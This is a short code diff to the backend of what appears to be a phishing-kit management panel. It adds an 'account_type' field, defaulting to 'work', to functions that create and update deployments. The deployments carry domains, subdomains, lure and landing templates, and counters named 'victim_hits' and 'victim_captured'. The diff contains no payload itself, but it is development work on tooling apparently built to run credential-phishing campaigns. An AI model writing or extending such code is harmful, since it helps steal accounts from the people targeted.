@@ -371,8 +371,8 @@ def create_deployment(data):
 
         cur = c.execute('''INSERT INTO deployments
                      (name,domain,subdomain,path,full_url,preland_template_id,preland_config,
-                      landing_template_id,success_template_id,success_url,languages,status,landing_config,landing_mode,success_config,owner_id)
-                     VALUES (?,?,?,?,?,?,?,?,?,?,?,'draft',?,?,?,?)''',
+                      landing_template_id,success_template_id,success_url,languages,status,landing_config,landing_mode,success_config,owner_id,account_type)
+                     VALUES (?,?,?,?,?,?,?,?,?,?,?,'draft',?,?,?,?,?)''',
                   (data.get('name',''),
                    data.get('domain','').lower(),
                    (data.get('subdomain') or '').lower(),
@@ -387,11 +387,12 @@ def create_deployment(data):
                    _jdump(land_cfg),
                    land_mode,
                    _jdump(succ_cfg),
-                   data.get('owner_id')))
+                   data.get('owner_id'),
+                   data.get('account_type') or 'work'))
         return cur.lastrowid
 
 def update_deployment(did, data):
-    allowed = {'name','domain','subdomain','path','preland_template_id','preland_config',
+    allowed = {'name','domain','subdomain','path','preland_template_id','preland_config','account_type',
                'landing_template_id','success_template_id','success_url','languages',
                'status','preland_html_cache','full_url','deployed_at','victim_hits','victim_captured',
                'landing_config','landing_mode','success_config','owner_id'}
